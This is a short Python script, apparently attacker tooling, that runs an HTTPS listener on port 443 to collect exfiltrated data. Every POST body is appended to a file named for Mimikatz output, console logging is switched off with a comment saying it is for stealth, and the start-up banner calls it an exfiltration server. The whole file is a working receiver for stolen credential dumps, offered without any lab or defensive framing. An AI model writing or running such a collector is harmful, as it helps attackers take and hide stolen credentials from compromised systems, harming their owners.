from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MyHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)

        with open("mimikatz_output.txt", "ab") as f:
            f.write(post_data + b"\n---\n")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Data received")

    def log_message(self, format, *args):
        return  # Disable console logging for stealth

# HTTPS setup
server_address = ('0.0.0.0', 443)
httpd = HTTPServer(server_address, MyHandler)

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile='server.pem', keyfile='server.pem')

httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

print("[+] HTTPS exfiltration server running on port 443...")
try:
    httpd.serve_forever()
except KeyboardInterrupt:
    print("\n[!] Server stopped manually.")
